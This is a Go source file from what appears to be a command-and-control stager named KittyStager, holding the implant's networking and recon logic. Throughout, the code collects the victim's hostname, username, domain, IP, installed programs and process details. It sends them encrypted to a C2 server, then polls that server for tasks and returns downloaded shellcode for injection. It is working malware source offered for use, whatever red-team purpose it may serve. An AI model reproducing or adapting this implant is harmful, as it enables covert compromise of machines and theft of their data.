package malwareUtil

import (
	"KittyStager/cmd/crypto"
	"KittyStager/cmd/util"
	"bytes"
	b64 "encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	_ "github.com/fourcorelabs/wintoken"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"time"
)

var (
	sleepTime int
	body      []byte
)

// Connect is the function that connects to the C2 and gets the shellcode
func Connect(malConf *util.MalConf) []byte {
	var err error
	//get the shellcode by http
	sleepTime = malConf.GetSleep()
	if err != nil {
		return nil
	}
	//initial recon
	host := recon()
	initChecks, err := util.InitUnmarshalJSON(host)
	if err != nil {
		return nil
	}
	cookieName := b64.StdEncoding.EncodeToString([]byte(initChecks.GetKittenName()))
	malConf.SetCookie(cookieName)
	//generate random password
	password := generatePassword(10)
	//check if server is reachable
	for {
		_, err = getRequest(malConf)
		if err == nil {
			break
		}
		sleep(sleepTime)
	}
	err = doPwreg(initChecks.GetKittenName(), password, malConf)
	if err != nil {
		return nil
	}
	key, err := doAuth(initChecks.GetKittenName(), password, malConf)
	//Initial callback
	data, _ := crypto.Encrypt(host, key)
	body, err = postRequest(data, malConf, malConf.GetEndPoint())
	//initial request
	// try to connect to the server
	fmt.Println(body)
	for {
		body, err = getRequest(malConf)
		// if the response is not a shellcode, sleep and try again
		if len(body) == 0 {
			sleep(sleepTime)
		} else {
			hexSc, err := crypto.Decrypt(body, []byte(key))
			if err != nil {
				return nil
			}
			task, err := util.TaskUnmarshalJSON(hexSc)
			if err != nil {
				return nil
			}
			switch task.Tag {
			case "shellcode":
				shellcode, _ := hex.DecodeString(string(task.Payload))
				//inject the shellcode
				return shellcode
			case "sleep":
				sleepTime, err = strconv.Atoi(string(task.Payload))
				if err != nil {
					return nil
				}
				sleep(sleepTime)
			}
		}
	}
}

// recon does some basic recon on the target
func recon() []byte {
	iniCheck := util.NewInitialChecks()
	// get machine name
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	iniCheck.SetHostname(hostname)
	//get username
	iniCheck.SetUsername(os.Getenv("USERNAME"))
	//get domain
	iniCheck.SetDomain(os.Getenv("USERDOMAIN"))
	//get local ip
	iniCheck.Ip = getLocalIP()
	//get kittenName
	iniCheck.SetKittenName(generateName(4))
	//get Programe Files
	dir, _ := os.ReadDir("C:\\Program Files")
	for _, file := range dir {
		iniCheck.SetDir(append(iniCheck.Dir, file.Name()))
	}
	dir86, _ := os.ReadDir("C:\\Program Files (x86)")
	for _, file := range dir86 {
		iniCheck.SetDir(append(iniCheck.Dir, file.Name()))
	}
	//process
	//pid
	iniCheck.SetPid(os.Getpid())
	//process name
	iniCheck.SetPName(os.Args[0])
	//current path
	currentPath, _ := os.Getwd()
	iniCheck.SetPath(currentPath)
	j, _ := json.Marshal(iniCheck)
	return j
}

// https://stackoverflow.com/questions/23558425/how-do-i-get-the-local-ip-address-in-go
// getLocalIP gets the local IP address of the machine
func getLocalIP() string {
	conn, err := net.Dial("udp", "100.100.100.100:3480")
	if err != nil {
		return ""
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr).IP.String()
	return localAddr
}

// generateName generates a random name for the kittens
func generateName(l int) string {
	letters := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	b := make([]rune, l)
	for i := range b {
		b[i] = letters[r1.Intn(len(letters))]
	}
	return string(b)
}

// generatePassword generates a random password for the kittens
func generatePassword(l int) string {
	letters := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789Â£$%^&*()_+")
	s1 := rand.NewSource(time.Now().UnixNano())
	r1 := rand.New(s1)
	b := make([]rune, l)
	for i := range b {
		b[i] = letters[r1.Intn(len(letters))]
	}
	return string(b)
}

// getRequest does a get request to the C2
func getRequest(conf *util.MalConf) ([]byte, error) {
	var body []byte
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	target := fmt.Sprintf("%s%s", conf.GetHost(), conf.GetEndPoint())
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return body, err
	}
	req.Header.Add("User-Agent", conf.GetUserA())
	if conf.GetCookie() != "" {
		req.Header.Add("Cookie", conf.GetCookie())
	}
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return body, err
	}
	return body, nil
}

// postRequest does a post request to the C2
func postRequest(cont []byte, conf *util.MalConf, endpoint string) ([]byte, error) {
	var body []byte
	target := fmt.Sprintf("%s%s", conf.GetHost(), endpoint)
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	req, err := http.NewRequest("POST", target, bytes.NewBuffer(cont))
	if err != nil {
		return body, err
	}
	req.Header.Add("User-Agent", conf.GetUserA())
	if conf.GetCookie() != "" {
		req.Header.Add("Cookie", conf.GetCookie())
	}
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return body, err
	}
	return body, nil
}

// sleep sleeps for a given amount of time
func sleep(t int) {
	time.Sleep(time.Duration(t) * time.Second)
}
